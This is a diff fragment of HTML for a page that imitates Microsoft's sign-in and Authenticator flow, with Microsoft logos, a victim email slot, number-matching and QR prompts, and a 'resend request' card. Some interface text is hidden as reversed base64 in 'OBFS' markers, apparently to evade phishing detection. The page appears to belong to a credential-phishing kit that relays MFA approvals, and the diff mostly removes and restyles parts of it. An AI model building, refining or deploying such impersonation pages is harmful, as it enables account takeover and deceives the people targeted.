+              id="idBtn_Back_Verify"
+              class="win-button button_secondary button ext-button secondary ext-secondary"
+              type="button"
               style="
-                width: 65px;
-                height: 65px;
-                border-radius: 8px;
-                border: 1px solid rgba(0, 0, 0, 0.644);
-                display: flex;
-                justify-content: center;
-                align-items: center;
+                background-color: transparent;
+                color: #0078d4;
+                padding: 0;
+                border: 1px solid #0078d4;
+                border-radius: 2px;
+                width: 100%;
+                height: 36px;
+                cursor: pointer;
+                font-size: 15px;
               "
             >
-              <span id="auth-number" style="font-size: 2.5rem"></span>
-            </div>
-          </div>
-
-          <p id="five" style="font-size: 14px">
-            No numbers in your app? Make sure to upgrade to the latest version
-          </p>
-          <div style="margin: 12px 0px 4px">
-            <span
-              id="six"
-              style="
-                color: #0067b8;
-                font-size: 0.8125rem;
-                font-weight: 400;
-                line-height: 1.25rem;
-              "
-              >OBFS==wdv5GI0h2ZpJHIwBXYgI3b0F2YpRnblhGd1FEI0Z2bz9mcjlWTgkXbgU2c1BCdn4WYjBSSEND</span
-            >
-          </div>
-          <div style="margin: 12px 0px 4px"></div>
-        </div>
-        <div
-          id="auth-verification-qr"
-          class="scroll"
-          style="
-            margin-left: auto;
-            margin-right: auto;
-            margin-top: 32px;
-            position: relative;
-            max-width: 350px;
-            width: calc(100% - 40px);
-            margin-bottom: 28px;
-            background-color: #ffffff;
-            text-align: left;
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-            min-width: 420px;
-            min-height: 238px;
-            overflow: hidden;
-            font-weight: 400;
-            font-size: 0.9375rem;
-            line-height: 1.25rem;
-            padding: 44px;
-            display: none;
-          "
-        >
-          <div>
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 23" style="height: 24px;">
-              <rect x="0" y="0" width="10.5" height="10.5" fill="#f25022"/>
-              <rect x="12" y="0" width="10.5" height="10.5" fill="#7fba00"/>
-              <rect x="0" y="12" width="10.5" height="10.5" fill="#00a4ef"/>
-              <rect x="12" y="12" width="10.5" height="10.5" fill="#ffb900"/>
-              <path d="M30.29 4.73h2.73v13.27h-2.73zm10.5 0v2.12h-3.07v2.85h2.8v2.12h-2.8v4.06h3.22V17h-5.95V4.73zm13.36 0c2.54 0 4.17 1.52 4.17 4.14 0 2.71-1.79 4.37-4.37 4.37h-1.52V17h-2.73V4.73zm-1.8 6.39h1.33c1.23 0 1.8-.63 1.8-1.84s-.57-1.84-1.8-1.84h-1.33zm10.5-6.39c2.28 0 3.85 1.33 3.85 3.22 0 1.8-1.33 2.73-2.54 2.94l2.94 5.11h-3.02l-2.54-4.57h-.86V17h-2.73V4.73zm-1.2 6.04h1.12c1.12 0 1.74-.46 1.74-1.33s-.63-1.33-1.74-1.33h-1.12zm13.01-6.04c3.51 0 5.88 2.28 5.88 6.14s-2.37 6.14-5.88 6.14-5.88-2.28-5.88-6.14 2.37-6.14 5.88-6.14zm0 2.28c-2.05 0-3.07 1.52-3.07 3.85s1.02 3.85 3.07 3.85 3.07-1.52 3.07-3.85-1.02-3.85-3.07-3.85zm13.27-2.28c2.45 0 4.03 1.12 4.03 3.33 0 1.52-.92 2.62-2.37 2.94 1.63.23 2.71 1.43 2.71 3.1 0 2.37-1.74 3.68-4.28 3.68h-4.74V4.73zm-1.98 5.34h1.63c1.23 0 1.89-.57 1.89-1.52s-.66-1.52-1.89-1.52h-1.63zm0 2.28v3.33h1.98c1.43 0 2.17-.63 2.17-1.66s-.74-1.66-2.17-1.66z" fill="#737373"/>
-            </svg>
-          </div>
-
-          <div style="margin: 16px 0px; height: 20px">
-            <span id="email-preview-4" class="email" style="font-size: 15px">
-            </span>
-          </div>
-          <div style="margin-bottom: 18px">
-            <span id="seven" style="font-weight: 500; font-size: 25px"
-              >OBFS=U3b5BSbvJnZgQXa0FWZzJCdlR2boNEI0Z2bz9mcjlWTgQnZuF2YhxGb0Z2SOND</span
-            >
-          </div>
-
-          <span style="font-size: 15px"
-            >Scan this code in your Microsoft Authenticator app to continue.
-            <span style="color: #0067b8" class="pointer"
-              >Get the app</span
-            ></span
-          >
-          <div
-            style="
-              display: flex;
-              width: 100%;
-              gap: 20px;
-              margin: 32px 0px;
-              justify-content: center;
-            "
-          >
-            <div>
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" style="width: 100px; height: 90px;">
-                <rect width="100" height="100" fill="white" stroke="#000" stroke-width="2"/>
-                <g fill="black">
-                  <rect x="5" y="5" width="20" height="20"/>
-                  <rect x="75" y="5" width="20" height="20"/>
-                  <rect x="5" y="75" width="20" height="20"/>
-                  <rect x="10" y="10" width="10" height="10" fill="white"/>
-                  <rect x="80" y="10" width="10" height="10" fill="white"/>
-                  <rect x="10" y="80" width="10" height="10" fill="white"/>
-                  <rect x="13" y="13" width="4" height="4"/>
-                  <rect x="83" y="13" width="4" height="4"/>
-                  <rect x="13" y="83" width="4" height="4"/>
-                  <rect x="30" y="10" width="5" height="5"/>
-                  <rect x="40" y="10" width="5" height="5"/>
-                  <rect x="50" y="10" width="5" height="5"/>
-                  <rect x="60" y="10" width="5" height="5"/>
-                  <rect x="10" y="30" width="5" height="5"/>
-                  <rect x="20" y="30" width="5" height="5"/>
-                  <rect x="30" y="30" width="5" height="5"/>
-                  <rect x="50" y="30" width="5" height="5"/>
-                  <rect x="70" y="30" width="5" height="5"/>
-                  <rect x="85" y="30" width="5" height="5"/>
-                  <rect x="10" y="40" width="5" height="5"/>
-                  <rect x="30" y="40" width="5" height="5"/>
-                  <rect x="45" y="40" width="10" height="10"/>
-                  <rect x="60" y="40" width="5" height="5"/>
-                  <rect x="70" y="40" width="5" height="5"/>
-                  <rect x="85" y="40" width="5" height="5"/>
-                  <rect x="20" y="50" width="5" height="5"/>
-                  <rect x="30" y="50" width="5" height="5"/>
-                  <rect x="60" y="50" width="5" height="5"/>
-                  <rect x="80" y="50" width="5" height="5"/>
-                  <rect x="10" y="60" width="5" height="5"/>
-                  <rect x="20" y="60" width="5" height="5"/>
-                  <rect x="35" y="60" width="5" height="5"/>
-                  <rect x="55" y="60" width="5" height="5"/>
-                  <rect x="65" y="60" width="5" height="5"/>
-                  <rect x="85" y="60" width="5" height="5"/>
-                  <rect x="30" y="85" width="5" height="5"/>
-                  <rect x="40" y="85" width="5" height="5"/>
-                  <rect x="50" y="85" width="5" height="5"/>
-                  <rect x="60" y="85" width="5" height="5"/>
-                  <rect x="70" y="85" width="5" height="5"/>
-                  <rect x="85" y="85" width="5" height="5"/>
-                </g>
-              </svg>
-            </div>
-            <div>
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#0078d4" style="width: 30px; height: 30px;">
-                <circle cx="12" cy="8" r="4"/>
-                <path d="M12 14c-5.33 0-8 2.67-8 4v2h16v-2c0-1.33-2.67-4-8-4z"/>
-              </svg>
-            </div>
-          </div>
-
-          <div
-            style="
-              display: flex;
-              width: 100%;
-              gap: 20px;
-              margin: 32px 0px;
-              justify-content: center;
-            "
-          >
-            <div
-              style="
-                width: 65px;
-                height: 65px;
-                border-radius: 8px;
-                border: 1px solid rgba(0, 0, 0, 0.644);
-                display: flex;
-                justify-content: center;
-                align-items: center;
-              "
-            >
-              <span id="auth-number" style="font-size: 2.5rem"></span>
-            </div>
-          </div>
-
-          <p id="seven" style="font-size: 14px">
-            No numbers in your app? Make sure to upgrade to the latest version
-          </p>
-          <div style="margin: 12px 0px 4px">
-            <span
-              id="eight"
-              style="
-                color: #0067b8;
-                font-size: 0.8125rem;
-                font-weight: 400;
-                line-height: 1.25rem;
-              "
-              >OBFS==wdv5GI0h2ZpJHIwBXYgI3b0F2YpRnblhGd1FEI0Z2bz9mcjlWTgkXbgU2c1BCdn4WYjBSSEND</span
-            >
-          </div>
-          <div style="margin: 12px 0px 4px"></div>
-        </div>
-        <style>
-          p {
-            margin: 16px 0px;
-          }
-        </style>
-        <div
-          id="resend-card"
-          class="scroll"
-          style="
-            margin-left: auto;
-            margin-right: auto;
-
-            position: relative;
-            max-width: 350px;
-            width: calc(100% - 40px);
-            padding: 44px;
-            margin-bottom: 28px;
-            background-color: #ffffff;
-            text-align: left;
-            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
-            min-width: 420px;
-            min-height: 238px;
-            overflow: hidden;
-            font-weight: 400;
-            font-size: 0.9375rem;
-            line-height: 1.25rem;
-            display: none;
-          "
-        >
-          <div>
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 23" style="height: 24px;">
-              <rect x="0" y="0" width="10.5" height="10.5" fill="#f25022"/>
-              <rect x="12" y="0" width="10.5" height="10.5" fill="#7fba00"/>
-              <rect x="0" y="12" width="10.5" height="10.5" fill="#00a4ef"/>
-              <rect x="12" y="12" width="10.5" height="10.5" fill="#ffb900"/>
-              <path d="M30.29 4.73h2.73v13.27h-2.73zm10.5 0v2.12h-3.07v2.85h2.8v2.12h-2.8v4.06h3.22V17h-5.95V4.73zm13.36 0c2.54 0 4.17 1.52 4.17 4.14 0 2.71-1.79 4.37-4.37 4.37h-1.52V17h-2.73V4.73zm-1.8 6.39h1.33c1.23 0 1.8-.63 1.8-1.84s-.57-1.84-1.8-1.84h-1.33zm10.5-6.39c2.28 0 3.85 1.33 3.85 3.22 0 1.8-1.33 2.73-2.54 2.94l2.94 5.11h-3.02l-2.54-4.57h-.86V17h-2.73V4.73zm-1.2 6.04h1.12c1.12 0 1.74-.46 1.74-1.33s-.63-1.33-1.74-1.33h-1.12zm13.01-6.04c3.51 0 5.88 2.28 5.88 6.14s-2.37 6.14-5.88 6.14-5.88-2.28-5.88-6.14 2.37-6.14 5.88-6.14zm0 2.28c-2.05 0-3.07 1.52-3.07 3.85s1.02 3.85 3.07 3.85 3.07-1.52 3.07-3.85-1.02-3.85-3.07-3.85zm13.27-2.28c2.45 0 4.03 1.12 4.03 3.33 0 1.52-.92 2.62-2.37 2.94 1.63.23 2.71 1.43 2.71 3.1 0 2.37-1.74 3.68-4.28 3.68h-4.74V4.73zm-1.98 5.34h1.63c1.23 0 1.89-.57 1.89-1.52s-.66-1.52-1.89-1.52h-1.63zm0 2.28v3.33h1.98c1.43 0 2.17-.63 2.17-1.66s-.74-1.66-2.17-1.66z" fill="#737373"/>
-            </svg>
-          </div>
-          <div
-            id="loader-resend"
-            style="height: 5px; position: relative; visibility: hidden"
-          >
-            <div class="progress1"></div>
-            <div class="progress2"></div>
-            <div class="progress3"></div>
-            <div class="progress4"></div>
-            <div class="progress5"></div>
-          </div>
-          <div style="margin: 16px 0px; height: 20px">
-            <span id="email-resend" class="email" style="font-size: 15px">
-            </span>
-          </div>
-          <div style="margin-bottom: 18px">
-            <span id="nine" style="font-weight: 500; font-size: 25px"
-              >OBFS=U3b5BSbvJnZgIXYlhGI0dibklGZgU2VEND</span
-            >
-          </div>
-
-          <span style="font-size: 15px"
-            >We sent an identity verification request to your app, but we didn't
-            hear from you in time.
-            <span style="color: #0067b8" class="pointer">View details</span>
-          </span>
-          <p id="resend" class="pointer" style="color: #0067b8">
-            Send another request to my Microsoft Authenticator app
-          </p>
-          <p style="font-size: 20px">Having trouble?</p>
-
-          <p>
-            <span style="color: #0067b8" class="pointer"
-              >Enter a security code</span
-            >
-            from your Microsoft account or authenticator app instead.
-          </p>
-
-          <p>
-            If you can't use an app right now
-            <span style="color: #0067b8" class="pointer"
-              >get a code a different way.</span
-            >
-          </p>
-          <p class="pointer" style="color: #0067b8">More information</p>
-          <div style="display: flex; justify-content: right">
-            <div
-              id="cancel-code-2"
-              class="pointer"
-              style="
-                color: #292929;
-                border-color: rgba(0, 0, 0, 0.2);
-                background-color: rgba(0, 0, 0, 0.2);
-                display: block;
-                width: 110px;
-                margin-top: 16px;
-                margin-right: 8px;
-                padding: 6px 12px 6px 12px;
-                text-align: center;
-              "
-            >
-              Cancel
-            </div>
+              Back
+            </button>
           </div>
 
           <div style="margin: 12px 0px 4px"></div>
